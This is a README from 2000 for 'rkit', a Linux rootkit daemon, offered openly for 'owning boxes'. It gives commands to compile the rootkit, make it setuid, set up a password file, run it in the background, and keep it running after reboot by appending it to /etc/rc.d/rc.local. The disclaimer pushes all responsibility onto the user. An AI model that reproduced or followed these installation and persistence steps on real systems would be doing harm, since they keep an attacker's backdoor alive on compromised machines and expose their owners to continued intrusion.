rkit by Deathr0w - deathr0w@attrition.org - deathr0w.speckz.com
October 2000

Credit to Bronc Buster, much of rkit is based on his work.
Credit to tsilik @ EFnet channel #C. Thanks for the help bro. 

Disclaimer:
  I am not responsible for anything that is done, not done, thought about,
  or even perceived with this program. If you're going to be a moron and
  go owning boxes, that is your responsibility, NOT MINE!


You must define your PASSFILE the same in BOTH rkit.c and pwd.c

rkit.c = actual rootkit daemon
rpwd.c = use this to change/create a new password
         note: You only have one shot so make sure you enter the
               correct password, there is no double password entering
               to check for mistakes. Also note this program uses
               the crypt() function just like Linux.


Instructions:
  1. After unzipping rkit.tar.gz change the marked variables in the source.
  2. Compiling: gcc -o rkit rkit.c && gcc -o rpwd rpwd.c
  3. chmod 4770 rkit
  4. Use ./rpwd to create a new password and password file.
  5. Run rkit like this: ./rkit & to run it as a background process.
  6. Your rootkit is running and you may connect to it now but you may want
     to add it to /etc/rc.d/rc.local as follows:

     echo "/path/rkit &" >> /etc/rc.d/rc.local

     now rkit will start every time the box is rebooted

  7. Enjoy and don't be stupid...
